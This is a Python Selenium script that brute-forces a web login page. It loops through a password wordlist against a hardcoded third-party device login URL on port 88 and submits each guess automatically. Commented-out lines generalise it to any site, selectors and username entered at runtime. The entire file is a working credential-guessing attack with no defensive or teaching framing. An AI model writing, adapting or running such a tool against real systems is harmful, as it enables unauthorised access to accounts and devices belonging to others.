import os
import selenium
import requests
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


# FIREFOX #
# browser = webdriver.Firefox(os.getcwd() + '\geckodriver.exe')
# CHROME #
browser = webdriver.Chrome(os.getcwd() + '\chromedriver.exe')


# INPUT DURING RUNTIME #
# website = raw_input('website: ')
# try:
#     request = requests.get(website)
#     if request.status_code == 200:
#         print('website exists')
# except:
#     print('website does not exist')
#     print('exiting now...')
#     exit()

# INPUT HARDCODED #
website = 'http://27831295.yms-tech.com:88/hp_login.html'


browser.get(website)


# INPUT DURING RUNTIME #
# username_selector = browser.find_element_by_css_selector(raw_input('username selector: '))
# password_selector = browser.find_element_by_css_selector(raw_input('password selector: '))
# login_selector = browser.find_element_by_css_selector(raw_input('login button selector: '))
# username = raw_input('username: ')

# INPUT HARDCODED #
# username_selector = browser.find_element_by_css_selector('#loginUsername')
password_selector = browser.find_element_by_css_selector('#table3 > tbody > tr:nth-child(3) > td:nth-child(2) > input')
login_selector = browser.find_element_by_css_selector('#table3 > tbody > tr:nth-child(4) > td:nth-child(2) > p:nth-child(2) > input')
# username = 'RedditUser'


count = 0
passwords = open(os.getcwd() + '\passwords_small.txt', 'r')
try:
    for password in passwords:
        count += 1

        # username_selector.clear()
        password_selector.clear()
        
        # username_selector.send_keys(username)
        password_selector.send_keys(password)
        login_selector.send_keys(Keys.RETURN)

        print('------------------------')
        print('attempt: ' + str(count))
        print('with password: ' + password)
        print('------------------------')

        WebDriverWait(browser, 15).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#table3 > tbody > tr:nth-child(3) > td:nth-child(2) > input')))
        # time.sleep(4)
except KeyboardInterrupt:
    print('exiting now...')
    exit()
except(selenium.common.exceptions.NoSuchElementException, selenium.common.exceptions.StaleElementReferenceException):
    print('you got in or something went wrong')
    print('exiting now...')
    exit()